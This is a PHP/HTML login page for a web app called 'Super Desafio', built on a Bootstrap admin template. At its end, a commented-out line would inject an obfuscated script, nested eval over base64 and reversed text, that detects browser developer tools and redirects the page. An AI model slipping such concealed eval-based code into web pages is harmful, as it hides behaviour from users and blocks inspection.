<!DOCTYPE html>
<html lang="pt">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="/src/img/favicon.ico">
    <title>Super Desafio - Login</title>

    <!-- Custom fonts for this template-->
    <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">

    <!-- Custom styles for this template-->
    <link href="./css/sb-admin-2.css" rel="stylesheet">

</head>

<body class="bg-gradient-primary">

    <div class="container">

        <!-- Outer Row -->
        <div class="row justify-content-center">

            <div class="col-xl-10 col-lg-12 col-md-9">

                <div class="card o-hidden border-0 shadow-lg my-5">
                    <div class="card-body p-0">
                        <!-- Nested Row within Card Body -->
                        <div class="row">
                            <div class="col-lg-6 d-none d-lg-block bg-login-image"></div>
                            <div class="col-lg-6">
                                <div class="p-5">
                                    <form class="user" action="../backend/session/auth.php" method="post">
                                        <!-- Error de login -->
                                        <? if (isset($_GET['error'])) { ?>
                                            <div class="alert alert-danger" role="alert">
                                                Login ou senha inválidos
                                            </div>
                                        <? } ?>
                                        <div class="form-group">
                                            <input type="text" class="form-control form-control-user" id="login" name="login" autocomplete="on" placeholder="Login">
                                        </div>
                                        <div class="form-group">
                                            <input type="password" class="form-control form-control-user" id="password" name="password" autocomplete="on" placeholder="Password">
                                        </div>
                                        <div class="form-group">
                                            <div class="custom-control custom-checkbox small">
                                                <input type="checkbox" class="custom-control-input" id="customCheck">
                                                <label class="custom-control-label" for="customCheck">Remember
                                                    Me</label>
                                            </div>
                                        </div>
                                        <button type="submit" class="btn btn-primary btn-user btn-block">
                                            Login
                                        </button>
                                        <hr>
                                    </form>
                                    <hr>
                                    <div class="text-center">
                                        <a class="small" href="forgot-password.html">Forgot Password?</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap core JavaScript-->
    <script src="../vendor/jquery/jquery.min.js"></script>
    <script src="../vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script>
        $(document).ready(function() {
            setTimeout(function() {
                $(".alert-danger").addClass('d-none');
            }, 3000);
        })
    </script>
    <!-- Core plugin JavaScript-->
    <script src="../vendor/jquery-easing/jquery.easing.min.js"></script>

    <!-- Custom scripts for all pages-->
    <script src="./js/sb-admin-2.js"></script>
    <?php
    /* echo "<script>eval(`eval(atob(\"dmFyIF9hID0gImEiO3ZhciBfWCA9ICJiIjt2YXIgX3IgPSAidCI7dmFyIF9aID0gIm8iO3ZhciBfRyA9ICJjIjt2YXIgX3MgPSAiMiI=\"));eval(eval(_a+_r+_Z+_X)(\"==wOpADMwIDIs03OpkSf91XKnkmchZWYTdCK0JXZsFGImYCIpcCQn5WayR3UvR3JoMXZkVHbj5Waus2YhR3cukicvJncFBydl5GK7BSKoUWdsFmd7BiOn5WayR3UvRHL913Oi02bj5SZsd2bvdmL3d3dv8iOzBHd0hmIg0DImVmco5ibvlGdhN2bs5ydvRmbpd3egkCK0V2Z7BiOldWYzNXZttHIsI3byJXRgcXZuhycllGdyVGcvJHUl5WamVGZuQ3YlpmYPhyZvxmLlx2bz52bjtTKoIXYlx2YuUGbvNnbvN2eg4TPgkCKowWY2JXZ05WS0V2c\".split(\"\").reverse().join(\"\")));`)</script>"; */
    ?>

</body>

</html>